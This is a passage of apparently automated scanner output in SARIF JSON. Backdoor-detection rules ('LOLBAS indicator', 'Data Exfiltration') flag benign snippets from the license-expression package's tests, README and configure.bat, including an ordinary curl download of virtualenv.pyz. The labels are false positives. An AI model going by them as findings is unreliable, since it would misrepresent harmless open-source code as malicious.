                      "markdown": "`        assert result.original_expression == 'Apache-2.0 + MIT'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'Invalid symbols sequence such as (A B) for token: \"+\" at position: 11']\n        assert result.invalid_symbols == ['+']\n\n    def test_validation_invalid_license_exception(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2369,
                  "startColumn": 142,
                  "endLine": 2369,
                  "endColumn": 146,
                  "snippet": {
                    "text": "        assert result.original_expression == 'GPL-2.0-or-later AND WxWindows-exception-3.1'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'A license exception symbol can only be used as an exception in a \"WITH exception\" statement. for token: \"WxWindows-exception-3.1\" at position: 21']\n        assert result.invalid_symbols == ['WxWindows-exception-3.1']\n\n    def test_validation_bad_syntax(self):\n",
                    "rendered": {
                      "text": "        assert result.original_expression == 'GPL-2.0-or-later AND WxWindows-exception-3.1'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'A license exception symbol can only be used as an exception in a \"WITH exception\" statement. for token: \"WxWindows-exception-3.1\" at position: 21']\n        assert result.invalid_symbols == ['WxWindows-exception-3.1']\n\n    def test_validation_bad_syntax(self):\n",
                      "markdown": "`        assert result.original_expression == 'GPL-2.0-or-later AND WxWindows-exception-3.1'\n        assert not result.normalized_expression\n        assert result.errors == [\n            'A license exception symbol can only be used as an exception in a \"WITH exception\" statement. for token: \"WxWindows-exception-3.1\" at position: 21']\n        assert result.invalid_symbols == ['WxWindows-exception-3.1']\n\n    def test_validation_bad_syntax(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 40,
                  "endLine": 746,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        l = Licensing()\n        expr2 = l.parse(\n            ' GPL-2.0 or (mit and LGPL-2.1) or bsd Or GPL-2.0  or (mit and LGPL-2.1)')\n        # note thats simplification does SORT the symbols such that they can\n        # eventually be compared sequence-wise. This sorting is based on license key\n        expected = 'GPL-2.0 OR bsd OR (LGPL-2.1 AND mit)'\n        assert str(expr2.simplify()) == expected\n",
                    "rendered": {
                      "text": "        l = Licensing()\n        expr2 = l.parse(\n            ' GPL-2.0 or (mit and LGPL-2.1) or bsd Or GPL-2.0  or (mit and LGPL-2.1)')\n        # note thats simplification does SORT the symbols such that they can\n        # eventually be compared sequence-wise. This sorting is based on license key\n        expected = 'GPL-2.0 OR bsd OR (LGPL-2.1 AND mit)'\n        assert str(expr2.simplify()) == expected\n",
                      "markdown": "`        l = Licensing()\n        expr2 = l.parse(\n            ' GPL-2.0 or (mit and LGPL-2.1) or bsd Or GPL-2.0  or (mit and LGPL-2.1)')\n        # note thats simplification does SORT the symbols such that they can\n        # eventually be compared sequence-wise. This sorting is based on license key\n        expected = 'GPL-2.0 OR bsd OR (LGPL-2.1 AND mit)'\n        assert str(expr2.simplify()) == expected\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2433,
                  "startColumn": 40,
                  "endLine": 2433,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n",
                    "rendered": {
                      "text": "                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n",
                      "markdown": "`                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2432,
                  "startColumn": 33,
                  "endLine": 2432,
                  "endColumn": 38,
                  "snippet": {
                    "text": "            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n",
                    "rendered": {
                      "text": "            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n",
                      "markdown": "`            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2431,
                  "startColumn": 28,
                  "endLine": 2431,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n",
                    "rendered": {
                      "text": "        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n",
                      "markdown": "`        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2430,
                  "startColumn": 24,
                  "endLine": 2430,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n",
                    "rendered": {
                      "text": "            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n",
                      "markdown": "`            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('spdx_license_key', ''),\n                'aliases': l.get('other_spdx_license_keys', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2408,
                  "startColumn": 40,
                  "endLine": 2408,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n",
                    "rendered": {
                      "text": "            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n",
                      "markdown": "`            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n        expected = Licensing(syms)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2407,
                  "startColumn": 33,
                  "endLine": 2407,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n",
                    "rendered": {
                      "text": "        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n",
                      "markdown": "`        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n        syms = [LicenseSymbol(**l) for l in lics]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/tests/test_license_expression.py"
                },
                "region": {
                  "startLine": 2406,
                  "startColumn": 24,
                  "endLine": 2406,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n",
                    "rendered": {
                      "text": "            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n",
                      "markdown": "`            license_info = json.load(f)\n        lics = [\n            {\n                'key': l.get('license_key', ''),\n                'is_exception': l.get('is_exception', ''),\n            } for l in license_info if l.get('spdx_license_key')\n        ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/README.rst"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 63,
                  "endLine": 145,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n",
                    "rendered": {
                      "text": "\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n",
                      "markdown": "`\n\t>>> licensing.parse('unknwon with foo', validate=True, strict=True)\n\tlicense_expression.ExpressionParseError: A plain license symbol cannot be used\n\tas an exception in a \"WITH symbol\" statement. for token: \"foo\" at position: 13\n\n\t>>> licensing.parse('unknwon with foo', validate=True)\n\tlicense_expression.ExpressionError: Unknown license key(s): unknwon, foo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/README.rst"
                },
                "region": {
                  "startLine": 239,
                  "startColumn": 55,
                  "endLine": 239,
                  "endColumn": 63,
                  "snippet": {
                    "text": "- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n",
                    "rendered": {
                      "text": "- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n",
                      "markdown": "`- Checkout a clone from https://github.com/aboutcode-org/license-expression.git\n\n- Then run ``./configure --dev`` and then ``source tmp/bin/activate`` on Linux and POSIX.\n  This will install all dependencies in a local virtualenv, including\n  development deps.\n\n- On Windows run  ``configure.bat --dev`` and then ``Scripts\\bin\\activate`` instead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 41,
                  "endLine": 13,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n",
                    "rendered": {
                      "text": "\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n",
                      "markdown": "`\r\n@rem ################################\r\n@rem # A configuration script to set things up:\r\n@rem # create a virtualenv and install or update thirdparty packages.\r\n@rem # Source this script for initial configuration\r\n@rem # Use configure --help for details\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 33,
                  "endLine": 181,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\r\n@rem ################################\r\n:cli_help\r\n    echo An initial configuration script\r\n    echo \"  usage: configure [options]\"\r\n    echo \" \"\r\n    echo The default is to configure for regular use. Use --dev for development.\r\n",
                    "rendered": {
                      "text": "\r\n@rem ################################\r\n:cli_help\r\n    echo An initial configuration script\r\n    echo \"  usage: configure [options]\"\r\n    echo \" \"\r\n    echo The default is to configure for regular use. Use --dev for development.\r\n",
                      "markdown": "`\r\n@rem ################################\r\n:cli_help\r\n    echo An initial configuration script\r\n    echo \"  usage: configure [options]\"\r\n    echo \" \"\r\n    echo The default is to configure for regular use. Use --dev for development.\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 30,
                  "endLine": 152,
                  "endColumn": 36,
                  "snippet": {
                    "text": ":install_packages\r\n@rem # install requirements in virtualenv\r\n@rem # note: --no-build-isolation means that pip/wheel/setuptools will not\r\n@rem # be reinstalled a second time and reused from the virtualenv and this\r\n@rem # speeds up the installation.\r\n@rem # We always have the PEP517 build dependencies installed already.\r\n\r\n",
                    "rendered": {
                      "text": ":install_packages\r\n@rem # install requirements in virtualenv\r\n@rem # note: --no-build-isolation means that pip/wheel/setuptools will not\r\n@rem # be reinstalled a second time and reused from the virtualenv and this\r\n@rem # speeds up the installation.\r\n@rem # We always have the PEP517 build dependencies installed already.\r\n\r\n",
                      "markdown": "`:install_packages\r\n@rem # install requirements in virtualenv\r\n@rem # note: --no-build-isolation means that pip/wheel/setuptools will not\r\n@rem # be reinstalled a second time and reused from the virtualenv and this\r\n@rem # speeds up the installation.\r\n@rem # We always have the PEP517 build dependencies installed already.\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 20,
                  "endLine": 134,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        )\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n",
                    "rendered": {
                      "text": "        )\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n",
                      "markdown": "`        )\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 11,
                  "endLine": 126,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\"\r\n    ) else (\r\n        if not exist \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" (\r\n            curl -o \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" %VIRTUALENV_PYZ_URL%\r\n\r\n            if %ERRORLEVEL% neq 0 (\r\n                exit /b %ERRORLEVEL%\r\n",
                    "rendered": {
                      "text": "            \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\"\r\n    ) else (\r\n        if not exist \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" (\r\n            curl -o \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" %VIRTUALENV_PYZ_URL%\r\n\r\n            if %ERRORLEVEL% neq 0 (\r\n                exit /b %ERRORLEVEL%\r\n",
                      "markdown": "`            \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\"\r\n    ) else (\r\n        if not exist \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" (\r\n            curl -o \"%CFG_ROOT_DIR%\\%VIRTUALENV_DIR%\\virtualenv.pyz\" %VIRTUALENV_PYZ_URL%\r\n\r\n            if %ERRORLEVEL% neq 0 (\r\n                exit /b %ERRORLEVEL%\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 20,
                  "endLine": 118,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    if exist \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" (\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n",
                    "rendered": {
                      "text": "    if exist \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" (\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n",
                      "markdown": "`    if exist \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" (\r\n        %PYTHON_EXECUTABLE% \"%CFG_ROOT_DIR%\\etc\\thirdparty\\virtualenv.pyz\" ^\r\n            --wheel embed --pip embed --setuptools embed ^\r\n            --seeder pip ^\r\n            --never-download ^\r\n            --no-periodic-update ^\r\n            --no-vcs-ignore ^\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 67,
                  "endLine": 107,
                  "endColumn": 72,
                  "snippet": {
                    "text": ":create_virtualenv\r\n@rem # create a virtualenv for Python\r\n@rem # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\r\n@rem # presence is not consistent across Linux distro and sometimes pip is not\r\n@rem # included either by default. The virtualenv.pyz app cures all these issues.\r\n\r\nif not exist \"%CFG_BIN_DIR%\\python.exe\" (\r\n",
                    "rendered": {
                      "text": ":create_virtualenv\r\n@rem # create a virtualenv for Python\r\n@rem # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\r\n@rem # presence is not consistent across Linux distro and sometimes pip is not\r\n@rem # included either by default. The virtualenv.pyz app cures all these issues.\r\n\r\nif not exist \"%CFG_BIN_DIR%\\python.exe\" (\r\n",
                      "markdown": "`:create_virtualenv\r\n@rem # create a virtualenv for Python\r\n@rem # Note: we do not use the bundled Python 3 \"venv\" because its behavior and\r\n@rem # presence is not consistent across Linux distro and sometimes pip is not\r\n@rem # included either by default. The virtualenv.pyz app cures all these issues.\r\n\r\nif not exist \"%CFG_BIN_DIR%\\python.exe\" (\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 6,
                  "endLine": 90,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\r\n\r\n@rem ################################\r\n@rem # Find a proper Python to run\r\n@rem # Use environment variables or a file if available.\r\n@rem # Otherwise the latest Python by default.\r\nif not defined PYTHON_EXECUTABLE (\r\n",
                    "rendered": {
                      "text": "\r\n\r\n@rem ################################\r\n@rem # Find a proper Python to run\r\n@rem # Use environment variables or a file if available.\r\n@rem # Otherwise the latest Python by default.\r\nif not defined PYTHON_EXECUTABLE (\r\n",
                      "markdown": "`\r\n\r\n@rem ################################\r\n@rem # Find a proper Python to run\r\n@rem # Use environment variables or a file if available.\r\n@rem # Otherwise the latest Python by default.\r\nif not defined PYTHON_EXECUTABLE (\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure.bat"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 6,
                  "endLine": 55,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\r\n@rem ################################\r\n@rem # Thirdparty package locations and index handling\r\n@rem # Find packages from the local thirdparty directory\r\nif exist \"%CFG_ROOT_DIR%\\thirdparty\" (\r\n    set PIP_EXTRA_ARGS=--find-links \"%CFG_ROOT_DIR%\\thirdparty\"\r\n)\r\n",
                    "rendered": {
                      "text": "\r\n@rem ################################\r\n@rem # Thirdparty package locations and index handling\r\n@rem # Find packages from the local thirdparty directory\r\nif exist \"%CFG_ROOT_DIR%\\thirdparty\" (\r\n    set PIP_EXTRA_ARGS=--find-links \"%CFG_ROOT_DIR%\\thirdparty\"\r\n)\r\n",
                      "markdown": "`\r\n@rem ################################\r\n@rem # Thirdparty package locations and index handling\r\n@rem # Find packages from the local thirdparty directory\r\nif exist \"%CFG_ROOT_DIR%\\thirdparty\" (\r\n    set PIP_EXTRA_ARGS=--find-links \"%CFG_ROOT_DIR%\\thirdparty\"\r\n)\r\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
